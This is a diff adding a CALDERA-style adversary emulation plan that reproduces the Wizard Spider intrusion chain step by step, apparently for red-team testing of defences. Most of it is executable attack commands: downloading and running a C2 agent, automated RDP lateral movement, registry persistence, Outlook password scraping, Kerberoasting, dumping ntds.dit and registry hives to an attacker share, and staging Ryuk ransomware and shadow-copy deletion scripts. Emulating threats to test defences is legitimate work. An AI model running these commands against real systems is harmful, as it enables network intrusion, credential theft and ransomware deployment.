@@ -1,0 +1,903 @@
+# wizard_spider.yaml - CALDERA Style TTPs
+
+- emulation_plan_details:
+    id: 23ee980e-f0c5-4e88-a02c-56aa862b2c76
+    adversary_name: Wizard Spider
+    adversary_description: Wizard Spider is a threat group considered to be a Russian-speaking cyber criminal gang associated with "big game hunting".
+    attack_version: 8
+    format_version: 1.0
+
+# Step 1 - Initial Compromise
+
+- id: 605bb8dc-f6ef-411c-ad1f-94d91bc23ee6
+  name: Upload Agent Executable to Initial Target
+  description: |
+    Uploads the agent executable to the target using smbclient.
+    Note that this ability drops an executable rather than a malicious word doc.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since it will handle initial access to the target.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  procedure_group: procedure_command_and_control
+  procedure_step: 1.A.1
+  platforms:
+    linux:
+      sh:
+        command: |
+          server="#{server}";
+          curl -s -X POST -H "file:sandcat.go" -H "platform:windows" -H "server:$server" -H "group:dorothy" $server/file/download > ChristmasCard.exe;
+          chmod +x ChristmasCard.exe;
+          smbclient -U '#{ad.domain.name}\#{initial.user.name}' //#{initial.target.host}/C$ -c "put ./ChristmasCard.exe Users/#{initial.user.name}/Desktop\ChristmasCard.exe;" "#{initial.user.password}"
+        cleanup: |
+          rm -f ChristmasCard.exe
+
+  input_arguments:
+    ad.domain.name:
+      description: The short name of the target domain
+      type: string
+      default: oz
+    initial.target.host:
+      description: The hostname or IPv4 address of the target host for initial access.
+      type: string
+      default: 10.0.0.7
+    initial.user.name:
+      description: The name of the target user account for initial access.
+      type: string
+      default: judy
+    initial.user.password:
+      description: The password of the target user account for initial access.
+      type: string
+      default: Passw0rd!
+
+- id: 5ca7a1b3-ff43-4057-b41f-0d8d4ecae848
+  name: RDP Connection to Initial Target (Dorothy)
+  description: |
+    Start RDP connection to Initial Target in preparation for user execution.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since it will handle initial access to the target.
+  tactic: initial-access
+  technique:
+    attack_id: T1078
+    name: Valid Accounts
+  procedure_group: procedure_initial_access
+  procedure_step: 1.A.1
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background xfreerdp +clipboard /u:#{ad.domain.name}\\#{initial.user.name} /p:"#{initial.user.password}" /v:#{initial.target.host} /cert-ignore
+
+  input_arguments:
+    ad.domain.name:
+      description: The short name of the target domain
+      type: string
+      default: oz
+    initial.target.host:
+      description: The hostname or IPv4 address of the target host for initial access.
+      type: string
+      default: 10.0.0.7
+    initial.user.name:
+      description: The name of the target user account for initial access.
+      type: string
+      default: judy
+    initial.user.password:
+      description: The password of the target user account for initial access.
+      type: string
+      default: Passw0rd!
+
+- id: bdf16e6e-ad27-4513-9d54-64289440265f
+  name: Run Agent Executable for Initial Access
+  description: |
+    Gains initial access by running the uploaded agent executable to establish a C2 connection.
+    Note that this ability runs an executable rather than a malicious word doc.
+    This ability must be run by an agent running on the attacker-controlled Linux machine (e.g. on the C2 server itself),
+    since it will handle initial access to the target. Requires xdotool to be installed on the running machine.
+  tactic: execution
+  technique:
+    attack_id: T1204.002
+    name: "User Execution: Malicious File"
+  cti_source: "https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html"
+  procedure_group: procedure_execution
+  procedure_step: 1.A.1
+  platforms:
+    linux:
+      sh:
+        command: |
+          sleep 30;
+          rdp_pid=$(pgrep -f "xfreerdp.*/v:#{initial.target.host}");
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          xdotool key --window "$rdp_window" Super_L;
+          sleep 5;
+          xdotool windowactivate --sync "$rdp_window" type --delay 200 "C:\Users\#{initial.user.name}\Desktop\ChristmasCard.exe";
+          sleep 3; xdotool key --window "$rdp_window" Return;
+          sleep 30;
+        timeout: 150
+
+  input_arguments:
+    initial.user.name:
+      description: The name of the target user account for initial access.
+      type: string
+      default: judy
+    initial.target.host:
+      description: The hostname or IPv4 address of the target host for initial access.
+      type: string
+      default: 10.0.0.7
+
+# Step 2 - Emotet Persistence
+
+- id: 04cf7962-28c4-40fb-8915-1fd632393a6f
+  name: Emotet Persistence
+  description: Wizard Spider establishes registry persistence by adding the blbdigital registry key.
+  tactic: persistence
+  technique:
+    attack_id: T1547.001
+    name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
+  cti_source:
+    - "https://www.cynet.com/attack-techniques-hands-on/emotet-vs-trump-deep-dive-analysis-of-a-killer-info-stealer/"
+    - "https://www.symantec.com/blogs/threat-intelligence/evolution-emotet-trojan-distributor"
+    - "https://www.us-cert.gov/ncas/alerts/TA18-201A"
+    - "https://www.picussecurity.com/blog/the-christmas-card-you-never-wanted-a-new-wave-of-emotet-is-back-to-wreak-havoc.html"
+  procedure_group: procedure_persistence
+  procedure_step: 2.A.1
+  platforms:
+    windows:
+      cmd:
+        command: |
+          reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v blbdigital /t REG_SZ /d "%userprofile%\Ygyhlqt\Bx5jfmo\R43H.dll,Control_RunDLL"
+        cleanup: |
+          reg.exe delete "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v blbdigital /f
+
+# Step 3 - Emotet Host Discovery and Credential Collection
+
+- id: 1a925a0f-7f95-4d5c-9f95-9408f65063a6
+  name: Emotet System Info Discovery
+  description: |
+    Wizard Spider performs system information discovery to collect information about the OS.
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
+  cti_source: "https://unit42.paloaltonetworks.com/emotet-command-and-control/"
+  procedure_group: procedure_discovery
+  procedure_step: 3.A.1
+  platforms:
+    windows:
+      proc:
+        command: |
+          systeminfo.exe
+
+- id: 69ce4dd6-ab00-4c63-bcfd-ab02da96c63a
+  name: Emotet Process Discovery
+  description: |
+    Emotet has been observed enumerating local processes.
+  tactic: discovery
+  technique:
+    attack_id: T1057
+    name: Process Discovery
+  cti_source: "https://unit42.paloaltonetworks.com/emotet-command-and-control/"
+  procedure_group: procedure_discovery
+  procedure_step: 3.A.2
+  platforms:
+    windows:
+      proc:
+        command: |
+          tasklist.exe
+
+- id: b80ca347-2d2a-4e33-8683-1975cda6664f
+  name: Emotet Download Outlook Scraper DLL
+  description: |
+    Wizard Spider downloads an Outlook scraper DLL and saves it as C:\Windows\SysWOW64\Outlook.dll.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  cti_source: "https://www.cisecurity.org/white-papers/ms-isac-security-primer-emotet/"
+  procedure_group: procedure_command_and_control
+  procedure_step: 3.A.3
+  platforms:
+    windows:
+      cmd:
+        command: |
+          move /y .\OutlookScraper.dll C:\Windows\SysWOW64\Outlook.dll
+        payloads:
+          - OutlookScraper.dll
+        cleanup: |
+          del /f C:\Windows\SysWOW64\Outlook.dll
+
+- id: 16abc48a-1f69-4246-83e3-4d0cec0e8d81
+  name: Emotet Scrape Email Content From Outlook
+  description: |
+    Wizard Spider leverages a module that scrapes email data from Outlook.
+  tactic: credential-access
+  technique:
+    attack_id: T1552
+    name: Unsecured Credentials
+  cti_source: "https://www.cisecurity.org/white-papers/ms-isac-security-primer-emotet/"
+  procedure_group: procedure_credential_access
+  procedure_step: 3.A.4
+  platforms:
+    windows:
+      psh:
+        command: |
+          Add-type -assembly "Microsoft.Office.Interop.Outlook" | out-null;
+          $olFolders = "Microsoft.Office.Interop.Outlook.olDefaultFolders" -as [type];
+          $outlook = new-object -comobject outlook.application;
+          $namespace = $outlook.GetNameSpace("MAPI");
+          $folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);
+          ($folder.items | Select-Object -ExpandProperty Body | Select-String "password") -replace "\s+", " " -join ";";
+
+- id: 5a5c65c7-d0ff-4275-8f8e-ea0b617369bd
+  name: Emotet Scrape Email Addresses from Outlook
+  description: |
+    Wizard Spider leverages a module that can scrape email addresses from Outlook.
+  tactic: collection
+  technique:
+    attack_id: T1114.001
+    name: "Email Collection: Local Email Collection"
+  cti_source: "https://www.cisecurity.org/white-papers/ms-isac-security-primer-emotet/"
+  procedure_group: procedure_collection
+  procedure_step: 3.A.5
+  platforms:
+    windows:
+      psh:
+        command: |
+          Add-type -assembly "Microsoft.Office.Interop.Outlook" | out-null;
+          $olFolders = "Microsoft.Office.Interop.Outlook.olDefaultFolders" -as [type];
+          $outlook = New-Object -comobject outlook.application;
+          $namespace = $outlook.GetNameSpace("MAPI");
+          $folder = $namespace.getDefaultFolder($olFolders::olFolderInBox);
+          ($folder.items | Select-Object -Unique -ExpandProperty SenderEmailAddress) -join ";";
+
+- id: 94942df6-6833-4e69-a6f7-89fda0ef25e1
+  name: Terminate RDP Session to Initial Target
+  description: |
+    End the RDP session to the initial target.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since the RDP connection originates from the attacker's machine.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.001
+    name: "Remote Services: Remote Desktop Protocol"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 3.A.5
+  platforms:
+    linux:
+      proc:
+        command: |
+          pkill xfreerdp
+
+# Step 4 - Move Laterally Deploy TrickBot
+
+- id: 070bfb3d-6938-4745-b1e7-039c97fdb7ca
+  name: Lateral Movement Via RDP (Toto)
+  description: |
+    Uses discovered credentials to RDP into the next target host.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since the RDP connection must originate from the attacker's machine.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.001
+    name: "Remote Services: Remote Desktop Protocol"
+  cti_source: "https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 4.A.1-2
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background xfreerdp +clipboard /u:#{ad.domain.name}\\#{second_host.user.name} /p:"#{second_host.user.password}" /v:#{second.target.host} /drive:X,./ /cert-ignore
+
+  input_arguments:
+    ad.domain.name:
+      description: The short name of the target domain
+      type: string
+      default: oz
+    second.target.host:
+      description: The hostname or IPv4 address of the target host for lateral movement.
+      type: string
+      default: 10.0.0.8
+    second_host.user.name:
+      description: The name of the target user account for lateral movement to the second target host.
+      type: string
+      default: bill
+    second_host.user.password:
+      description: The password of the target user account for lateral movement to the second target host.
+      type: string
+      default: Fall2021
+
+- id: 1b21e49a-9550-4616-b125-d790a73165a6
+  name: Download and Execute Agent for Lateral Movement (Toto)
+  description: |
+    Downloads a new agent executable and executes it on the target host over RDP.
+    This ability must be run by an agent running on the attacker-controlled Linux machine (e.g. on the C2 server itself),
+    since the RDP connection will be from the attacker's machine.
+    Requires xdotool to be installed on the running machine.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  cti_source: "https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/"
+  procedure_group: procedure_command_and_control
+  procedure_step: 4.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          server="#{server}";
+          curl -s -X POST -H "file:sandcat.go" -H "platform:windows" -H "server:$server" -H "group:toto" $server/file/download > TrickBotClientExe.exe;
+          chmod +x TrickBotClientExe.exe;
+          sleep 30;
+          rdp_pid=$(pgrep -f "xfreerdp.*/v:#{second.target.host}");
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          xdotool windowactivate --sync "$rdp_window" key Super_L;
+          sleep 5; xdotool windowactivate --sync "$rdp_window" type --delay 200 "cmd.exe";
+          sleep 3; xdotool windowactivate --sync "$rdp_window" key Return;
+          sleep 10; xdotool windowactivate --sync "$rdp_window" type --delay 200 'copy \\tsclient\X\TrickBotClientExe.exe %AppData%\uxtheme.exe';
+          sleep 1; xdotool windowactivate --sync "$rdp_window" key Return;
+          sleep 15; xdotool windowactivate --sync "$rdp_window" type --delay 200 "cd %AppData%";
+          sleep 1; xdotool windowactivate --sync "$rdp_window" key Return;
+          sleep 3; xdotool windowactivate --sync "$rdp_window" type --delay 200 "uxtheme.exe";
+          sleep 1; xdotool windowactivate --sync "$rdp_window" key Return;
+          sleep 30;
+        timeout: 150
+        cleanup: |
+          rm -f TrickBotClientExe.exe
+
+  input_arguments:
+    second.target.host:
+      description: The hostname or IPv4 address of the target host for lateral movement.
+      type: string
+      default: 10.0.0.8
+
+# Step 5 - TrickBot Discovery
+
+- id: 4750c01e-98fc-43f8-8178-14bcc66c2cc9
+  name: TrickBot System Information Discovery
+  description: |
+    Wizard Spider uses TrickBot to gathers the OS version, machine name, CPU type, amount of RAM available, and UEFI/BIOS firmware information from the victim’s machine.
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
+  cti_source:
+    - "https://blog.trendmicro.com/trendlabs-security-intelligence/trickbot-shows-off-new-trick-password-grabber-module/"
+    - "https://www.securityartwork.es/wp-content/uploads/2017/07/Trickbot-report-S2-Grupo.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: 5.A.1
+  platforms:
+    windows:
+      cmd:
+        command: systeminfo > discovery.txt
+        cleanup: del /f discovery.txt
+
+- id: dc4236df-0484-4763-891a-c2f6ede5293d
+  name: TrickBot System Service Discovery (systeminfo)
+  description: |
+    Wizard Spider uses TrickBot to collect a list of installed programs and services on the system’s machine
+  tactic: discovery
+  technique:
+    attack_id: T1007
+    name: System Service Discovery
+  cti_source:
+    - "https://blog.trendmicro.com/trendlabs-security-intelligence/trickbot-shows-off-new-trick-password-grabber-module/"
+    - "https://www.securityartwork.es/wp-content/uploads/2017/07/Trickbot-report-S2-Grupo.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: 5.A.2
+  platforms:
+    windows:
+      cmd:
+        command: sc query >> discovery.txt
+
+- id: 53e87d17-b904-4739-92f0-4b5169d9a1d4
+  name: TrickBot Local Account Discovery
+  description: |
+    Wizard Spider uses TrickBot to collect the local users of the system.
+  tactic: discovery
+  technique:
+    attack_id: T1087.001
+    name: "Account Discovery: Local Account"
+  cti_source:
+    - "https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware"
+    - "https://blog.trendmicro.com/trendlabs-security-intelligence/trickbot-shows-off-new-trick-password-grabber-module/"
+    - "https://www.securityartwork.es/wp-content/uploads/2017/07/Trickbot-report-S2-Grupo.pdf"
+  procedure_group: procedure_discovery
+  procedure_step: 5.A.3
+  platforms:
+    windows:
+      cmd:
+        command: net user >> discovery.txt
+
+- id: e639caf1-8987-4aad-b6f1-6a1d186e2ec9
+  name: TrickBot Domain Account Discovery
+  description: |
+    Wizard Spider uses TrickBot to collect the domain users of the system.
+  tactic: discovery
+  technique:
+    attack_id: T1087.002
+    name: "Account Discovery: Domain Account"
+  cti_source:
+    - "https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware"
+    - "https://blog.trendmicro.com/trendlabs-security-intelligence/trickbot-shows-off-new-trick-password-grabber-module/"
+  procedure_group: procedure_discovery
+  procedure_step: 5.A.4
+  platforms:
+    windows:
+      cmd:
+        command: net user /domain >> discovery.txt
+
+- id: f6de05d2-5ec5-4d27-b19c-f8cf817d6213
+  name: TrickBot System Network Configuration Discovery
+  description: |
+    Wizard Spider uses TrickBot to obtain the IP address, location, and other relevant network information from the victim’s machine.
+  tactic: discovery
+  technique:
+    attack_id: T1016
+    name: System Network Configuration Discovery
+  cti_source: "https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware"
+  procedure_group: procedure_discovery
+  procedure_step: 5.A.5
+  platforms:
+    windows:
+      cmd:
+        command: ipconfig /all
+
+- id: aa1b8eef-2c76-4184-b7a7-2b5c175e49f6
+  name: TrickBot System Network Connections Discovery
+  description: |
+    Wizard Spider uses TrickBot to obtain the network connection information from the victim’s machine.
+  tactic: discovery
+  technique:
+    attack_id: T1049
+    name: System Network Connections Discovery
+  cti_source: "https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware"
+  procedure_group: procedure_discovery
+  procedure_step: 5.A.6
+  platforms:
+    windows:
+      cmd:
+        command: netstat -tan
+
+- id: 1f30fdc6-88c0-4c69-958d-6101468bd0ec
+  name: TrickBot System Information Discovery (net config)
+  description: |
+    Wizard Spider uses TrickBot to gather client specfic information
+  tactic: discovery
+  technique:
+    attack_id: T1082
+    name: System Information Discovery
+  cti_source: "https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware"
+  procedure_group: procedure_discovery
+  procedure_step: 5.A.7
+  platforms:
+    windows:
+      cmd:
+        command: net config workstation >> discovery.txt
+
+- id: ed40220d-9d1f-4191-b73f-54f17278e256
+  name: TrickBot Domain Trust Discovery
+  description: |
+    Wizard Spider uses TrickBot to gather domain specfic information
+  tactic: discovery
+  technique:
+    attack_id: T1482
+    name: Domain Trust Discovery
+  cti_source: "https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware"
+  procedure_group: procedure_discovery
+  procedure_step: 5.A.8
+  platforms:
+    windows:
+      cmd:
+        command: nltest /domain_trusts /all_trusts >> discovery.txt
+
+- id: ced2de73-54fa-49ec-b60d-de635dcde620
+  name: TrickBot Permission Groups Discovery
+  description: |
+    Wizard Spider uses TrickBot to identify the groups the user on a compromised host belongs to.
+  tactic: discovery
+  technique:
+    attack_id: T1069
+    name: Permission Groups Discovery
+  cti_source: "https://www.cybereason.com/blog/dropping-anchor-from-a-trickbot-infection-to-the-discovery-of-the-anchor-malware"
+  procedure_group: procedure_discovery
+  procedure_step: 5.A.9
+  platforms:
+    windows:
+      cmd:
+        command: whoami /groups >> discovery.txt
+
+# Step 6 - Kerberoast the DC
+
+- id: 3de63509-4171-488f-8938-ce346677a5a6
+  name: TrickBot Perform Kerberoasting
+  description: Wizard Spider performs Kerberoasting using a public tool, Rubeus. Through Kerberoasting, Wizard Spider obtains encrypted credentials.
+  tactic: credential-access
+  technique:
+    attack_id: T1558.003
+    name: "Steal or Forge Kerberos Tickets: Kerberoasting"
+  cti_source: "https://thedfirreport.com/2020/10/08/ryuks-return/"
+  procedure_group: procedure_credential_access
+  procedure_step: 6.A.1-2
+  platforms:
+    windows:
+      cmd:
+        command: |
+          rubeus.exe kerberoast /domain:#{ad.domain.full_name}
+        payloads:
+          - rubeus.exe
+
+  input_arguments:
+    ad.domain.full_name:
+      description: The fully qualified name of the target domain
+      type: string
+      default: oz.local
+
+- id: dedb77a9-16b9-498c-bd07-074891abd345
+  name: Terminate RDP Session to Second Target (Toto)
+  description: |
+    End the RDP session to the second target.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since the RDP connection originates from the attacker's machine.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.001
+    name: "Remote Services: Remote Desktop Protocol"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 6.A.2
+  platforms:
+    linux:
+      proc:
+        command: |
+          pkill xfreerdp
+
+# Step 7 - Lateral Movement to DC
+
+- id: b8ad9654-80a1-4fde-b2d4-c0de7648621c
+  name: Prepare Tools for Ingress Tool Transfer (Wizard)
+  description: |
+    Prepares the local folder with kill.bat, window.bat, and ryuk.exe to use as the RDP shared-drive.
+    This ability must be run by an agent running on the attacker-controlled Linux machine (e.g. on the C2 server itself),
+    since the RDP connection will be from the attacker's machine.
+    Requires xdotool to be installed on the running machine.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  cti_source: "https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/"
+  procedure_group: procedure_command_and_control
+  procedure_step: 7.A.1
+  platforms:
+    linux:
+      sh:
+        command: |
+          mkdir -p ws_tools;
+          cp kill.bat ./ws_tools/;
+          cp window.bat ./ws_tools/;
+          cp ryuk.exe ./ws_tools/;
+        payloads:
+          - kill.bat
+          - window.bat
+          - ryuk.exe
+
+- id: 6b9da996-145e-40b1-935f-6818a89bb561
+  name: Lateral Movement Via RDP (Wizard)
+  description: |
+    Uses discovered credentials to RDP into the domain controller.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since the RDP connection must originate from the attacker's machine.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.001
+    name: "Remote Services: Remote Desktop Protocol"
+  cti_source: "https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 7.A.1-2
+  platforms:
+    linux:
+      proc:
+        command: |
+          exec-background xfreerdp +clipboard /u:#{ad.domain.name}\\#{domain.admin.name} /p:"#{domain.admin.password}" /v:#{dc.target.host} /drive:X,./ws_tools /cert-ignore
+
+  input_arguments:
+    ad.domain.name:
+      description: The short name of the target domain
+      type: string
+      default: oz
+    dc.target.host:
+      description: The hostname or IPv4 address of the domain controller for lateral movement.
+      type: string
+      default: 10.0.0.4
+    domain.admin.name:
+      description: The name of the domain admin account for lateral movement to the domain controller.
+      type: string
+      default: vfleming
+    domain.admin.password:
+      description: The password of the domain admin account for lateral movement to the domain controller.
+      type: string
+      default: q27VYN8xflPcYumbLMit
+
+- id: 7a46a8c9-f46a-481b-8b38-68a3aea68114
+  name: Download and Execute Agent for Lateral Movement (Wizard)
+  description: |
+    Downloads a new agent executable and executes it on the domain controller over RDP.
+    This ability must be run by an agent running on the attacker-controlled Linux machine (e.g. on the C2 server itself),
+    since the RDP connection will be from the attacker's machine.
+    Requires xdotool to be installed on the running machine.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  cti_source: "https://www.crowdstrike.com/blog/timelining-grim-spiders-big-game-hunting-tactics/"
+  procedure_group: procedure_command_and_control
+  procedure_step: 7.A.3
+  platforms:
+    linux:
+      sh:
+        command: |
+          sleep 30;
+          rdp_pid=$(pgrep -f "xfreerdp.*/v:#{dc.target.host}");
+          rdp_window=$(xdotool search --pid "$rdp_pid");
+          xdotool windowactivate --sync "$rdp_window" key Super_L;
+          sleep 5; xdotool windowactivate --sync "$rdp_window" type --delay 200 "powershell.exe";
+          sleep 5; xdotool windowactivate --sync "$rdp_window" key --clearmodifiers --delay 200 Control_L+Shift_L+Return;
+          sleep 10; xdotool windowactivate --sync "$rdp_window" key Left;
+          sleep 3; xdotool windowactivate --sync "$rdp_window" key Return;
+          sleep 15; xdotool windowactivate --sync "$rdp_window" type --delay 200 '$Body=@{file="sandcat.go";server="#{server}";platform="windows";group="wizard"}';
+          sleep 3; xdotool windowactivate --sync "$rdp_window" key Return;
+          sleep 3; xdotool windowactivate --sync "$rdp_window" type --delay 200 'Invoke-WebRequest -Uri #{server}/file/download -OutFile $env:AppData\uxtheme.exe -Method POST -Headers $Body';
+          sleep 3; xdotool windowactivate --sync "$rdp_window" key Return;
+          sleep 15; xdotool windowactivate --sync "$rdp_window" type --delay 200 '& $env:AppData\uxtheme.exe';
+          sleep 3; xdotool windowactivate --sync "$rdp_window" key Return;
+          sleep 30;
+        timeout: 180
+
+  input_arguments:
+    dc.target.host:
+      description: The hostname or IPv4 address of the domain controller for lateral movement.
+      type: string
+      default: 10.0.0.4
+
+- id: 1536bbcf-858e-44c2-95cb-ebd46d7434be
+  name: Wizard Spider Registry Persistence
+  description: |
+    Wizard Spider has established persistence using Userinit by adding the Registry key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon.
+  tactic: persistence
+  technique:
+    attack_id: T1547.004
+    name: "Boot or Logon Autostart Execution: Winlogon Helper DLL"
+  cti_source: "https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html"
+  procedure_group: procedure_persistence
+  procedure_step: 7.A.4
+  platforms:
+    windows:
+      psh:
+        command: |
+          Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" "Userinit.exe, $env:AppData\uxtheme.exe" -Force
+        cleanup: |
+          Remove-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\" "Userinit" -Force
+
+- id: 46430565-f9e8-4580-b497-f5f561962d95
+  name: Wizard Spider Domain Group Discovery
+  description: |
+    Wizard Spider has used AdFind to enumerate domain computers, including the domain controller.
+  tactic: discovery
+  technique:
+    attack_id: T1069.002
+    name: "Permission Groups Discovery: Domain Groups"
+  cti_source: "https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/"
+  procedure_group: procedure_discovery
+  procedure_step: 7.A.5
+  platforms:
+    windows:
+      psh:
+        command: |
+          adfind -f "(objectcategory=group)"
+
+# Step 8 - Dump Active Directory Database (ntds.dit)
+
+- id: 5746a074-1f51-4a96-8e69-f7eb81578f5e
+  name: Wizard Spider Create Volume Shadow Copy
+  description: |
+    Wizard Spider uses vssadmin to create a volume shadow copy in order to collect the active directory database (ntds.dit).
+    Wizard Spider has gained access to credentials via exported copies of the ntds.dit Active Directory database.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: "OS Credential Dumping: NTDS"
+  cti_source: "https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html"
+  procedure_group: procedure_credential_access
+  procedure_step: 8.A.1
+  platforms:
+    windows:
+      psh:
+        command: |
+          cmd /c "vssadmin.exe create shadow /for=C:";
+        parsers:
+          plugins.emu.app.parsers.vssadmin_shadow:
+            - source: vssadmin.shadow_copy.name
+
+- id: 05202302-6b80-4549-b3bb-2ead90c249a5
+  name: Wizard Spider Exfil Volume Shadow Copy
+  description: |
+    Wizard Spider exfiltrates the shadow copy files using an RDP-mounted network share.
+    Wizard Spider has gained access to credentials via exported copies of the ntds.dit Active Directory database.
+  tactic: credential-access
+  technique:
+    attack_id: T1003.003
+    name: "OS Credential Dumping: NTDS"
+  cti_source: "https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html"
+  procedure_group: procedure_credential_access
+  procedure_step: 8.A.1
+  platforms:
+    windows:
+      psh:
+        command: |
+          cmd /c "copy #{vssadmin.shadow_copy.name}\Windows\NTDS\NTDS.dit \\TSCLIENT\X\ntds.dit";
+          cmd /c "copy #{vssadmin.shadow_copy.name}\Windows\System32\config\SYSTEM \\TSCLIENT\X\VSC_SYSTEM_HIVE";
+
+- id: bb98782b-2519-4721-a723-b8f027b441d4
+  name: Wizard Spider Save Registry Hive
+  description: |
+    Uses cmd.exe to execute reg.exe to save HKLM\SYSTEM
+  tactic: credential-access
+  technique:
+    attack_id: T1003.002
+    name: "OS Credential Dumping: Security Account Manager"
+  cti_source: "https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html"
+  procedure_group: procedure_credential_access
+  procedure_step: 8.A.2
+  platforms:
+    windows:
+      psh:
+        command: |
+          cmd /c "reg SAVE HKLM\SYSTEM \\TSCLIENT\X\SYSTEM_HIVE"
+
+# Step 9 - Ryuk Inhibit System Recovery
+
+- id: d9787a1d-0fd4-4776-a073-00423a33e7e2
+  name: Wizard Spider Downloads kill.bat
+  description: |
+    Mounts share so Ryuk can encrypt lateral drives.
+    Downloads kill.bat, which Ryuk has used for stopping services, disabling services and killing processes.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  cti_source: "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf"
+  procedure_group: procedure_command_and_control
+  procedure_step: 9.A.1
+  platforms:
+    windows:
+      psh:
+        command: |
+          cmd /c "net use Z: \\#{second.target.host}\C$";
+          cmd /c "copy \\TSCLIENT\X\kill.bat C:\Users\Public\kill.bat";
+        cleanup: |
+          net use /delete Z: ;
+          if (Test-Path "C:\Users\Public\kill.bat") { rm C:\Users\Public\kill.bat };
+
+  input_arguments:
+    second.target.host:
+      description: hostname or IPv4 address of the second target host whose share we will mount to encrypt its drives laterally.
+      type: string
+      default: 10.0.0.8
+
+- id: 180eb3b8-1590-4b77-9b8c-7972c198f09e
+  name: Wizard Spider Runs kill.bat
+  description: |
+    Ryuk has called kill.bat for stopping services, disabling services and killing processes.
+    Ryuk can launch icacls /grant Everyone:F /T /C /Q to delete every access-based restrictions on files and directories.
+    Ryuk has stopped services related to anti-virus.
+    This also covers T1222.001 - File and Directory Permissions Modification: Windows File and Directory Permissions Modification
+  tactic: impact
+  technique:
+    attack_id: T1489
+    name: Service Stop
+  cti_source: "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf"
+  procedure_group: procedure_impact
+  procedure_step: 9.A.2-3
+  platforms:
+    windows:
+      psh:
+        command: |
+          cmd /c "C:\Users\Public\kill.bat" 2> $null;
+          exit 0;
+
+- id: 69b0a93e-3c71-42f5-8019-13289d9353b3
+  name: Wizard Spider Downloads window.bat
+  description: |
+    Downloads window.bat, which will use vssadmin Delete Shadows /all /quiet to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  cti_source: "https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/"
+  procedure_group: procedure_command_and_control
+  procedure_step: 9.A.4
+  platforms:
+    windows:
+      psh:
+        command: |
+          cmd /c "copy \\TSCLIENT\X\window.bat C:\Users\Public\window.bat"
+        cleanup: |
+          if (Test-Path "C:\Users\Public\window.bat") { rm C:\Users\Public\window.bat }
+
+- id: 3f878fc6-d5b0-4c95-b022-88f0becbb61e
+  name: Wizard Spider Runs window.bat
+  description: |
